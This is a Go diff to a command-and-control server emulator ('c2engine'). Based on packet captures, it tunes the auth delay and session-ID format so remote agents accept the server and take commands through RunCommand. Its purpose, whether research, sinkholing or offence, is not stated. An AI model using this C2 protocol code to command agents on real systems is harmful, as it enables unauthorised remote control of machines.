@@ -23,8 +23,9 @@ package c2engine
 
 import (
 	"bufio"
+	"crypto/rand"
+	"encoding/base64"
 	"encoding/binary"
-	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -68,10 +69,12 @@ type OfficialTCPServer struct {
 	ReadTimeout time.Duration
 	// AuthExtras 为 true 时在认证通过后追加 ack + 会话 ID（实验开关）。
 	AuthExtras bool
-	client     map[string]interface{}
-	results    chan string
-	closed     bool
-	Logf       func(format string, args ...interface{})
+	// AuthDelay 是校验 md5(vkey) 之后、回 "sucs" 之前的等待（实测真实服务端约 300ms）。
+	AuthDelay time.Duration
+	client    map[string]interface{}
+	results   chan string
+	closed    bool
+	Logf      func(format string, args ...interface{})
 }
 
 // officialConn 是一条连接的状态机。
@@ -96,6 +99,7 @@ func NewOfficialTCPServer(addr, vkey, salt string) *OfficialTCPServer {
 		results:     make(chan string, 32),
 		Logf:        Logf,
 		ReadTimeout: 60 * time.Second,
+		AuthDelay:   300 * time.Millisecond,
 	}
 }
 
@@ -255,7 +259,11 @@ func (c *officialConn) handle(plain []byte) error {
 		// 期望 md5(vkey)
 		want := OfficialAuthResponse(s.vkey)
 		if strings.EqualFold(string(plain), want) {
-			// 注意：实测在 sucs 前加延迟会让 agent 连 conf 都不发，因此这里**不加**延迟。
+			// 实测（R26，带时间戳的抓包）：真实服务端在收到 md5(vkey) 后约
+			// 270–370ms 才回 "sucs"。立即回或只等 20ms 都会让 agent 不认。
+			if d := s.AuthDelay; d > 0 {
+				time.Sleep(d)
+			}
 			if err := c.send([]byte(officialAuthOK)); err != nil {
 				s.Logf("official-tcp: send sucs failed: %v", err)
 				return err
@@ -425,13 +433,20 @@ func (s *OfficialTCPServer) RunCommand(cmd string, timeout time.Duration) (strin
 	}
 }
 
-// officialSessionID 生成 16 字节会话 ID（与抓包里的形态一致：16 个字符）。
+// officialSessionID 生成 16 字符会话 ID。
+//
+// 抓包里的形态是**大小写字母+数字**（如 FQ0022pIHROm5ibh），不是纯十六进制；
+// 这里按同样字符集随机生成。
 func officialSessionID() string {
-	buf := make([]byte, 8)
-	for i := range buf {
-		buf[i] = byte(time.Now().UnixNano() >> (uint(i%8) * 8))
+	// 抓包里的会话 ID（如 FQ0022pIHROm5ibh）是 **12 字节随机数的 base64**（16 字符）；
+	// 用普通字母数字串时 agent 收到后会直接关闭连接（R26 实测）。
+	buf := make([]byte, 12)
+	if _, err := rand.Read(buf); err != nil {
+		for i := range buf {
+			buf[i] = byte(time.Now().UnixNano() >> (uint(i%8) * 8))
+		}
 	}
-	return hex.EncodeToString(buf)[:16]
+	return base64.StdEncoding.EncodeToString(buf)
 }
 
 // truncateForLog 截断长文本用于日志。
